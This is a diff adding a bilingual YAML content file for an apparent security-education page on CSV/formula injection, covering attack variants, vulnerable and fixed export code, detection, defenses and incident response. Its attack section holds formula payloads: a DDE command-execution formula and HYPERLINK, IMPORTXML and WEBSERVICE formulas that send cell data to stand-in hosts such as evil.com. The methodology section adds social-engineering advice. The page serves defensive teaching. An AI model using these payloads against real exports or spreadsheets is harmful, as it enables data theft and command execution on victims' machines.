@@ -1,0 +1,445 @@
+meta:
+  id: csvi
+  threatId: "1.11"
+  severity: Medium
+  color: "#eab308"
+  colorRgb: 234,179,8
+  cwe: CWE-1236
+  cvss: "8.8"
+  standard: OWASP A03:2021
+hero:
+  titleMain: CSV / Formula
+  titleGrad: Injection
+  titleTail: ""
+  topbar: CSV / Formula Injection
+  lead:
+    en: "CSV Injection occurs when user-controlled input containing spreadsheet formula characters (=, +, -, @) is exported to CSV without sanitization. When the victim opens the file in Excel or Google Sheets, the cell content is interpreted and executed as a formula — enabling Remote Code Execution via DDE, silent data exfiltration via IMPORTXML, or phishing via HYPERLINK."
+    pl: "CSV Injection występuje gdy dane kontrolowane przez użytkownika zawierające znaki formuł arkuszowych (=, +, -, @) są eksportowane do CSV bez sanityzacji. Gdy ofiara otworzy plik w Excelu lub Google Sheets, zawartość komórki jest interpretowana i wykonywana jako formuła — umożliwiając zdalne wykonanie kodu przez DDE, cichą eksfiltrację danych przez IMPORTXML lub phishing przez HYPERLINK."
+  metrics:
+    - k: CWE-1236
+      v:
+        en: Weakness ID
+        pl: ID słabości
+    - k: "8.8"
+      v: CVSS · High
+    - k: A03:2021
+      v: OWASP Top 10
+    - k: "5"
+      v:
+        en: Attack variants
+        pl: Warianty ataku
+  sources:
+    - label: OWASP CSV Injection
+      url: https://owasp.org/www-community/attacks/CSV_Injection
+    - label: CWE-1236 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/1236.html
+    - label: OWASP CSV Injection Cheat Sheet
+      url: https://cheatsheetseries.owasp.org/cheatsheets/CSV_Injection_Prevention_Cheat_Sheet.html
+sectionOrder:
+  - overview
+  - types
+  - code
+  - method
+  - defense
+  - incidents
+  - tools
+  - compliance
+  - ir
+  - migration
+nav:
+  - id: overview
+    en: Overview
+    pl: Przegląd
+  - id: types
+    en: Attack variants
+    pl: Warianty ataków
+  - id: code
+    en: Vuln vs Secure
+    pl: Podatny vs Bezpieczny
+  - id: method
+    en: Methodology
+    pl: Metodyka
+  - id: defense
+    en: Defense layers
+    pl: Warstwy obrony
+  - id: incidents
+    en: Real incidents
+    pl: Incydenty
+  - id: tools
+    en: Detection
+    pl: Wykrywanie
+  - id: compliance
+    en: Compliance
+    pl: Zgodność
+  - id: ir
+    en: Incident response
+    pl: Reagowanie
+  - id: migration
+    en: Legacy migration
+    pl: Migracja legacy
+sections:
+  attacks:
+    title:
+      en: Attack variants
+      pl: Warianty ataków
+    lead:
+      en: Five distinct ways CSV Injection manifests — from noisy DDE command execution to silent data exfiltration via Google Sheets functions.
+      pl: Pięć sposobów, w jakie CSV Injection się ujawnia — od głośnego wykonania poleceń DDE po cichą eksfiltrację danych przez funkcje Google Sheets.
+    items:
+      - name: DDE Injection (Remote Code Execution)
+        sev: critical
+        description:
+          en: "Dynamic Data Exchange payload triggers arbitrary OS command execution when the victim opens the CSV in Excel and clicks through 1-2 security prompts. Bypasses macro security settings because DDE is not classified as a macro by Excel's Trust Center."
+          pl: "Ładunek DDE wyzwala dowolne polecenie systemowe gdy ofiara otworzy CSV w Excelu i kliknie przez 1-2 ostrzeżenia bezpieczeństwa. Omija zabezpieczenia makr bo DDE nie jest klasyfikowane jako makro w Trust Center Excela."
+        payload: "=cmd|'/C calc.exe'!A0"
+      - name: HYPERLINK Injection (Phishing / Exfiltration)
+        sev: high
+        description:
+          en: "Embeds a clickable hyperlink that sends cell contents to an attacker-controlled server when clicked. Renders as a normal-looking link in Excel/Sheets, enabling phishing attacks that appear to originate from the trusted application."
+          pl: "Osadza klikalny hiperlink który wysyła zawartość komórek na serwer atakującego po kliknięciu. Renderuje się jako normalny link w Excelu/Sheets, umożliwiając ataki phishingowe które wyglądają jakby pochodziły z zaufanej aplikacji."
+        payload: "=HYPERLINK(\"http://evil.com/steal?data=\"&A1&B1,\"Click for details\")"
+      - name: IMPORTXML Exfiltration (Google Sheets)
+        sev: high
+        description:
+          en: "Google Sheets functions IMPORTXML(), IMPORTDATA(), and IMPORTHTML() auto-fetch external URLs without user confirmation. A formula injected into a shared sheet silently exfiltrates data — no click required, no prompt shown."
+          pl: "Funkcje Google Sheets IMPORTXML(), IMPORTDATA() i IMPORTHTML() automatycznie pobierają zewnętrzne URL-e bez potwierdzenia użytkownika. Formuła wstrzyknięta do współdzielonego arkusza cicho eksfiltruje dane — bez kliknięcia, bez ostrzeżenia."
+        payload: "=IMPORTXML(\"http://attacker.com/steal?\"&A1&B1,\"//x\")"
+      - name: WEBSERVICE + CONCATENATE (Excel Exfiltration)
+        sev: medium
+        description:
+          en: "Excel's WEBSERVICE function makes HTTP GET requests. Combined with CONCATENATE, it can send cell contents to an external server. Less stealthy than IMPORTXML but works in desktop Excel."
+          pl: "Funkcja WEBSERVICE w Excelu wykonuje zapytania HTTP GET. W połączeniu z CONCATENATE może wysłać zawartość komórek na zewnętrzny serwer. Mniej dyskretne niż IMPORTXML ale działa w desktopowym Excelu."
+        payload: "=WEBSERVICE(CONCATENATE(\"http://evil.com/?\",A1,B1))"
+      - name: Content-Type / Body Injection
+        sev: medium
+        description:
+          en: "In email-based CSV attacks, injecting newlines and content-type headers can transform a simple CSV export email into a multipart message with malicious attachments or HTML body."
+          pl: "W atakach CSV bazujących na emailach, wstrzyknięcie nowych linii i nagłówków content-type może przekształcić prosty email z eksportem CSV w wiadomość multipart ze złośliwymi załącznikami lub ciałem HTML."
+        payload: "+AAA\\r\\nContent-Type: text/html\\r\\n\\r\\n<script>alert(1)</script>"
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: "The fix is the same in every language: sanitize cell values before writing to CSV by prefixing formula characters with a single quote."
+      pl: "Naprawa jest taka sama w każdym języku: sanityzuj wartości komórek przed zapisem do CSV, prefiksując znaki formuł apostrofem."
+    languages:
+      - label: Python
+        lang: python
+        vulnerable: |-
+          # VULNERABLE — user input written directly to CSV
+          import csv
+          with open('export.csv', 'w') as f:
+              writer = csv.writer(f)
+              writer.writerow(['Name', 'Note'])
+              for user in users:
+                  writer.writerow([user.name, user.note])
+                  # user.note = "=cmd|'/C calc'!A1" → RCE
+        safe: |-
+          # SECURE — prefix formula characters with single quote
+          import csv
+          FORMULA_CHARS = set('=+-@\t\r')
+          def sanitize_cell(value):
+              s = str(value)
+              if s and s[0] in FORMULA_CHARS:
+                  return "'" + s
+              return s
+          with open('export.csv', 'w') as f:
+              writer = csv.writer(f)
+              writer.writerow(['Name', 'Note'])
+              for user in users:
+                  writer.writerow([sanitize_cell(user.name), sanitize_cell(user.note)])
+      - label: JavaScript (Node.js)
+        lang: javascript
+        vulnerable: |-
+          // VULNERABLE — raw values into CSV string
+          const rows = users.map(u => `${u.name},${u.note}`);
+          fs.writeFileSync('export.csv', rows.join('\n'));
+          // u.note = "=HYPERLINK(\"http://evil.com\")" → phishing
+        safe: |-
+          // SECURE — sanitize + quote every cell
+          const FORMULA_RE = /^[=+\-@\t\r]/;
+          function sanitize(val) {
+            const s = String(val);
+            return FORMULA_RE.test(s) ? "'" + s : s;
+          }
+          const csv = users.map(u =>
+            `"${sanitize(u.name)}","${sanitize(u.note)}"`
+          ).join('\n');
+      - label: PHP
+        lang: php
+        vulnerable: |-
+          <?php // VULNERABLE — fputcsv with raw user data
+          $fp = fopen('export.csv', 'w');
+          foreach ($users as $u) {
+              fputcsv($fp, [$u['name'], $u['note']]);
+              // $u['note'] = "=cmd|'/C calc'!A1"
+          }
+        safe: |-
+          <?php // SECURE — sanitize before writing
+          function sanitize_csv($val) {
+              $s = (string)$val;
+              if (preg_match('/^[=+\-@\t\r]/', $s)) return "'" . $s;
+              return $s;
+          }
+          $fp = fopen('export.csv', 'w');
+          foreach ($users as $u) {
+              fputcsv($fp, [sanitize_csv($u['name']), sanitize_csv($u['note'])]);
+          }
+      - label: Java
+        lang: java
+        vulnerable: |-
+          // VULNERABLE — Apache Commons CSV without sanitization
+          CSVPrinter printer = new CSVPrinter(writer, CSVFormat.DEFAULT);
+          for (User u : users) {
+              printer.printRecord(u.getName(), u.getNote());
+              // u.getNote() = "=cmd|'/C calc'!A1"
+          }
+        safe: |-
+          // SECURE — sanitize + use explicit STRING cell type (Apache POI)
+          private String sanitize(String val) {
+              if (val != null && !val.isEmpty()
+                  && "=+-@\t\r".indexOf(val.charAt(0)) >= 0)
+                  return "'" + val;
+              return val;
+          }
+          // Or better: use XLSX with explicit cell types
+          Cell cell = row.createCell(0);
+          cell.setCellType(CellType.STRING);
+          cell.setCellValue(userInput);
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker progresses from finding an export feature to achieving code execution on the victim's machine.
+      pl: Jak atakujący przechodzi od znalezienia funkcji eksportu do wykonania kodu na maszynie ofiary.
+    steps:
+      - title:
+          en: Identify export functionality
+          pl: Identyfikacja funkcji eksportu
+        description:
+          en: "Find any feature that exports data to CSV/XLSX: user lists, reports, invoices, logs, audit trails. Target fields that accept user input."
+          pl: "Znajdź każdą funkcję eksportującą dane do CSV/XLSX: listy użytkowników, raporty, faktury, logi, ścieżki audytu. Celuj w pola przyjmujące dane od użytkownika."
+      - title:
+          en: Test with harmless formula
+          pl: Test z nieszkodliwą formułą
+        description:
+          en: "Submit =1+1 in an input field. Export to CSV, open in Excel. If the cell shows 2 instead of =1+1, the application is vulnerable."
+          pl: "Wpisz =1+1 w pole wejściowe. Eksportuj do CSV, otwórz w Excelu. Jeśli komórka pokazuje 2 zamiast =1+1, aplikacja jest podatna."
+      - title:
+          en: Escalate payload
+          pl: Eskalacja ładunku
+        description:
+          en: "Replace =1+1 with DDE payload (=cmd|'/C calc'!A0), HYPERLINK exfiltration, or IMPORTXML for Google Sheets. Each targets different impact."
+          pl: "Zamień =1+1 na ładunek DDE (=cmd|'/C calc'!A0), eksfiltrację HYPERLINK lub IMPORTXML dla Google Sheets. Każdy celuje w inny wpływ."
+      - title:
+          en: Social engineering
+          pl: Inżynieria społeczna
+        description:
+          en: "The attack requires the victim to open the file and click through security warnings. Craft the context: 'Monthly sales report from your CRM' is more convincing than a random CSV."
+          pl: "Atak wymaga by ofiara otworzyła plik i kliknęła przez ostrzeżenia bezpieczeństwa. Przygotuj kontekst: 'Miesięczny raport sprzedaży z CRM' jest bardziej przekonujący niż losowy CSV."
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: "Defense in depth — prefix sanitization is the primary fix, but alternative formats and headers provide additional protection."
+      pl: "Obrona w głąb — prefiksowanie jest główną naprawą, ale alternatywne formaty i nagłówki dają dodatkową ochronę."
+    items:
+      - rank: 1
+        eff: 95
+        kind: primary
+        label:
+          en: "Cell prefix sanitization"
+          pl: "Prefiksowanie komórek"
+        note:
+          en: "Prepend single quote (') to any cell starting with =, +, -, @, \\t, \\r. Forces spreadsheet to treat as text."
+          pl: "Dodaj apostrof (') przed każdą komórką zaczynającą się od =, +, -, @, \\t, \\r. Wymusza traktowanie jako tekst."
+      - rank: 2
+        eff: 90
+        kind: primary
+        label:
+          en: "Use XLSX with explicit STRING cell type"
+          pl: "Użyj XLSX z jawnym typem STRING"
+        note:
+          en: "Generate XLSX via library (openpyxl, Apache POI) with cell type set to STRING. Formulas cannot execute in text cells."
+          pl: "Generuj XLSX przez bibliotekę (openpyxl, Apache POI) z typem komórki ustawionym na STRING. Formuły nie mogą się wykonać w komórkach tekstowych."
+      - rank: 3
+        eff: 60
+        kind: strong
+        label:
+          en: "Content-Disposition: attachment"
+          pl: "Content-Disposition: attachment"
+        note:
+          en: "Force download instead of browser rendering. Prevents automatic opening but user can still open manually."
+          pl: "Wymuś pobieranie zamiast renderowania w przeglądarce. Zapobiega automatycznemu otwarciu ale użytkownik może nadal otworzyć ręcznie."
+      - rank: 4
+        eff: 40
+        kind: mitigation
+        label:
+          en: "UTF-8 BOM prefix"
+          pl: "Prefiks UTF-8 BOM"
+        note:
+          en: "Prepend \\xEF\\xBB\\xBF to CSV file. Forces Excel to use text import wizard which does not auto-execute formulas."
+          pl: "Dodaj \\xEF\\xBB\\xBF na początku pliku CSV. Wymusza tryb importu tekstu w Excelu który nie wykonuje formuł automatycznie."
+      - rank: 5
+        eff: 30
+        kind: mitigation
+        label:
+          en: "Input validation at ingestion"
+          pl: "Walidacja wejścia przy przyjmowaniu"
+        note:
+          en: "Reject or flag values starting with formula characters at input time. Defense in depth but may reject legitimate data."
+          pl: "Odrzuć lub oznacz wartości zaczynające się od znaków formuł przy wejściu. Obrona w głąb ale może odrzucić legalne dane."
+      - rank: 6
+        eff: 15
+        kind: weak
+        label:
+          en: "User education"
+          pl: "Edukacja użytkowników"
+        note:
+          en: "Inform admins about dangers of enabling content/DDE in exported files. Not reliable as sole defense."
+          pl: "Poinformuj adminów o zagrożeniach włączania zawartości/DDE w eksportowanych plikach. Niewiarygodna jako jedyna obrona."
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: CSV Injection has been found in major platforms and libraries — from Shopify to PhpSpreadsheet.
+      pl: CSV Injection wykryto w dużych platformach i bibliotekach — od Shopify po PhpSpreadsheet.
+    items:
+      - org: PhpSpreadsheet
+        year: 2018
+        impact: Server-side RCE
+        cost: CVE-2018-19277 (CVSS 8.8)
+        description:
+          en: "The library parsed and evaluated formulas from imported spreadsheets server-side, allowing Remote Code Execution on the server itself — not just client-side. Fixed by disabling formula calculation by default in PhpSpreadsheet 1.5.0."
+          pl: "Biblioteka parsowała i wykonywała formuły z importowanych arkuszy po stronie serwera, umożliwiając zdalne wykonanie kodu na serwerze — nie tylko po stronie klienta. Naprawione przez wyłączenie kalkulacji formuł domyślnie w PhpSpreadsheet 1.5.0."
+      - org: LibreOffice
+        year: 2014
+        impact: Remote Code Execution
+        cost: CVE-2014-3524 (CVSS 7.5)
+        description:
+          en: "Crafted formulas in CSV files triggered command execution when opened in LibreOffice Calc."
+          pl: "Spreparowane formuły w plikach CSV wyzwalały wykonanie poleceń po otwarciu w LibreOffice Calc."
+      - org: Shopify (HackerOne)
+        year: 2015
+        impact: DDE RCE on admin machines
+        cost: Bug bounty payout
+        description:
+          en: "HackerOne report #72785 demonstrated CSV injection in Shopify's customer export. Attacker injected DDE payloads into customer name fields, which were exported unsanitized to CSV. When admin opened the export, DDE executed commands."
+          pl: "Raport HackerOne #72785 zademonstrował CSV injection w eksporcie klientów Shopify. Atakujący wstrzyknął ładunki DDE do pól nazwisk klientów, które były eksportowane bez sanityzacji. Gdy admin otworzył eksport, DDE wykonało polecenia."
+      - org: Multiple SaaS (HackerOne)
+        year: 2018
+        impact: Admin machine compromise
+        cost: "$500-$4,000 per bounty"
+        description:
+          en: "Multiple bug bounty reports documented CSV injection in platforms including Uber, Slack, and numerous CRM/helpdesk tools. Payloads in user-controlled fields (name, address, comment) were exported unsanitized."
+          pl: "Wiele raportów bug bounty udokumentowało CSV injection w platformach w tym Uber, Slack i wielu narzędziach CRM/helpdesk. Ładunki w polach kontrolowanych przez użytkownika (imię, adres, komentarz) były eksportowane bez sanityzacji."
+    inlineSources:
+      - label: CVE-2018-19277
+        url: https://nvd.nist.gov/vuln/detail/CVE-2018-19277
+      - label: CVE-2014-3524
+        url: https://nvd.nist.gov/vuln/detail/CVE-2014-3524
+      - label: "HackerOne #72785 (Shopify)"
+        url: https://hackerone.com/reports/72785
+      - label: OWASP CSV Injection
+        url: https://owasp.org/www-community/attacks/CSV_Injection
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: "Detect formula injection at export time with regex, and validate with manual testing using =1+1."
+      pl: "Wykrywaj formula injection w momencie eksportu regexem i waliduj ręcznym testem z =1+1."
+    sast:
+      - - Semgrep
+        - "Custom rules matching csv.writer/fputcsv without sanitization"
+      - - Bandit
+        - "Python CSV module usage audit"
+      - - CodeQL
+        - "Taint tracking from user input to CSV write"
+    dast:
+      - - Manual testing
+        - "Input =1+1 into fields, export CSV, check if cell evaluates to 2"
+      - - Burp Suite
+        - "Intercept CSV export response, check for unsanitized formula chars"
+      - - Custom script
+        - "Regex scan exported CSV for cells matching ^[=+\\-@\\t\\r]"
+    note:
+      en: "<strong>Key insight:</strong> The vulnerability is in the OUTPUT (CSV generation), not the INPUT. Scanning input alone is insufficient — you must sanitize at export time."
+      pl: "<strong>Kluczowe:</strong> Podatność jest w WYJŚCIU (generowanie CSV), nie w wejściu. Skanowanie samego wejścia jest niewystarczające — musisz sanityzować w momencie eksportu."
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: Where CSV Injection prevention maps onto compliance controls.
+      pl: Gdzie zapobieganie CSV Injection mapuje się na kontrole zgodności.
+    items:
+      - std: PCI DSS
+        items:
+          - 6.2.4 — secure coding vs injection
+          - 6.3.2 — review custom code for export features
+      - std: GDPR
+        items:
+          - Art. 25 — security by design (sanitize exports)
+          - Art. 32 — appropriate technical measures
+      - std: SOC 2
+        items:
+          - CC6.1 — logical access controls
+          - CC7.1 — vulnerability detection
+    inlineSources:
+      - label: CWE-1236
+        url: https://cwe.mitre.org/data/definitions/1236.html
+      - label: OWASP CSV Prevention
+        url: https://cheatsheetseries.owasp.org/cheatsheets/CSV_Injection_Prevention_Cheat_Sheet.html
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If you discover CSV Injection is being exploited against your users.
+      pl: Jeśli odkryjesz że CSV Injection jest wykorzystywane przeciwko Twoim użytkownikom.
+    steps:
+      - en: Identify all export endpoints that generate CSV/XLSX from user data
+        pl: Zidentyfikuj wszystkie endpointy eksportujące CSV/XLSX z danymi użytkowników
+      - en: Immediately deploy prefix sanitization to all export functions
+        pl: Natychmiast wdróż prefiksowanie sanityzujące we wszystkich funkcjach eksportu
+      - en: Audit database for stored formula payloads in user-controlled fields
+        pl: Sprawdź bazę danych pod kątem zapisanych ładunków formuł w polach kontrolowanych przez użytkowników
+      - en: Notify affected users who may have opened malicious CSV exports
+        pl: Powiadom dotkniętych użytkowników którzy mogli otworzyć złośliwe eksporty CSV
+      - en: Scan exported file history for cells starting with formula characters
+        pl: Przeskanuj historię eksportowanych plików pod kątem komórek zaczynających się od znaków formuł
+      - en: Consider switching from CSV to XLSX with explicit string cell types
+        pl: Rozważ przejście z CSV na XLSX z jawnie ustawionymi typami komórek tekstowych
+      - en: Add WAF rules to detect formula patterns in POST data destined for storage
+        pl: Dodaj reguły WAF do wykrywania wzorców formuł w danych POST przeznaczonych do zapisu
+  migration:
+    title:
+      en: Legacy migration strategy
+      pl: Strategia migracji legacy
+    lead:
+      en: Three phases to fix CSV export across an existing codebase.
+      pl: Trzy fazy naprawy eksportu CSV w istniejącej bazie kodu.
+    steps:
+      - title:
+          en: 1 · Inventory all export endpoints
+          pl: 1 · Inwentaryzacja endpointów eksportu
+        description:
+          en: "Grep codebase for csv.writer, fputcsv, CSVPrinter, json2csv, writerow — catalogue every place that generates downloadable files."
+          pl: "Przeszukaj kod pod kątem csv.writer, fputcsv, CSVPrinter, json2csv, writerow — skataloguj każde miejsce generujące pliki do pobrania."
+      - title:
+          en: 2 · Add sanitize wrapper
+          pl: 2 · Dodaj wrapper sanityzujący
+        description:
+          en: "Create a shared sanitize_cell() function. Apply to every cell value at write time. Test with =1+1 payload."
+          pl: "Stwórz współdzieloną funkcję sanitize_cell(). Zastosuj do każdej wartości komórki w momencie zapisu. Przetestuj ładunkiem =1+1."
+      - title:
+          en: 3 · Migrate to XLSX
+          pl: 3 · Migracja do XLSX
+        description:
+          en: "Replace raw CSV generation with XLSX library (openpyxl/Apache POI) using explicit STRING cell types. This is the long-term structural fix."
+          pl: "Zastąp surowe generowanie CSV biblioteką XLSX (openpyxl/Apache POI) z jawnym typem komórek STRING. To jest długoterminowa naprawa strukturalna."
